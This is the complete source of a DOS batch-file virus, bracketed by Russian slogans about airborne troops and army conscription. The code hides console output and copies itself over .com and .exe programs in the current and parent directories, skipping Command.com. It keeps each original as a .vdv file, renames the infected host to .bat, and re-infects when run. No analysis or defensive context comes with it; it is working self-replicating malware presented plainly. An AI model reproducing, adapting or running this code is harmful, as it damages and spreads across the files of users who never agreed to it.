:Воздушно-десантные войска!!!...
@echo off
set v=copy
ctty nul
if exist %0.vdv goto vdv
for %%t in (*.com *.exe ..\*.com ..\*.exe) do set VDV=%%t
for %%r in (%VDV%) do if "%VDV%"=="Command.com" goto end
for %%q in (%VDV%) do %v% %%q *.vdv
attrib %VDV% -r -a -s
for %%t in (%VDV%) do %v% %0 %%t
ren %VDV% *.bat
goto dvd
:vdv
ren %0.vdv %0.com
ctty con
%0.com %1 %2 %3 %4 %5
ren %0.com %0.vdv
type %0.vdv >> %0.bat
:dvd
exit
Скоро в армию!
